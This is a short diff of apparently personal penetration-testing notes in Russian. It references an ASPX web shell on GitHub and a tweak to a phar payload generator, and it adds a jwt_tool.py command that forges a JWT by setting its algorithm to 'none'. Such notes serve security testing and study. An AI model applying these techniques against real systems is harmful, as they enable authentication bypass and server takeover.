@@ -175,5 +175,7 @@ https://github.com/jivoi/pentest/blob/master/shell/insomnia_shell.aspx
 	phar.readonly = Off
 	Т.е. в файле phar_creator.py была строка "bash_command = "php phar_generator.php " + phar_payload", я её изменил на "bash_command = "php -c php.ini phar_generator.php " + phar_payload", вот что он показывает
 
+# JWT 
 
+  	python3 jwt_tool.py --exploit a eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.PjndlgESbR_7uPWq7tKFd6o7l799Y45mU5KvDcO2nPI   (вставляем none в alg)
  
